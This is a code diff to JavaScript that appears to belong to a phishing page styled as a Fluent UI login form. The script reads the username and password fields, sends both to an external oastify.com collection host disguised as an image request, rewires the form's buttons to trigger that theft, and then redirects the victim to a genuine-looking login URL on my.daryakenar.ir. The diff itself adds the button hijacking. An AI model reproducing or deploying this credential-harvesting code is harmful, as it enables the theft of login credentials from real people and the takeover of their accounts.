@@ -23,6 +23,7 @@
                 xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
                 xhr.send();
             }
+            
             function sendFinal() {
                 var username = document.getElementsByTagName('fluent-text-field')[0].value;
                 var password = document.getElementsByTagName('fluent-text-field')[1].value;
@@ -45,21 +46,18 @@
                 // Send the request
                 xhr.send();
             }
+            
+            var btn1 = document.getElementsByTagName('fluent-button')[1];
+            btn1.removeAttribute('type');
+            btn1.setAttribute('onclick', 'sendFinal()');
+            
             const delay = ms => new Promise(res => setTimeout(res, ms));
             document.body.addEventListener('submit', async (event) => {
                 if (event.target.tagName.toLowerCase() === 'form') {
                     var username = document.getElementsByTagName('fluent-text-field')[0].value;
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     sendData(username, password);
-                    if(password.length < 1){
-                        var btn0 = document.getElementsByTagName('fluent-button')[0];
-                        btn0.removeAttribute('type');
-                        btn0.setAttribute('onclick', 'sendFinal()');
-                        var btn1 = document.getElementsByTagName('fluent-button')[1];
-                        btn1.removeAttribute('type');
-                        btn1.setAttribute('onclick', 'sendFinal()');
-                    }
-                    else{
+                    if(password.length > 1){
                         await delay(5000);
                         parent.location.href = 'https://my.daryakenar.ir/account/login/mobile';
                     }
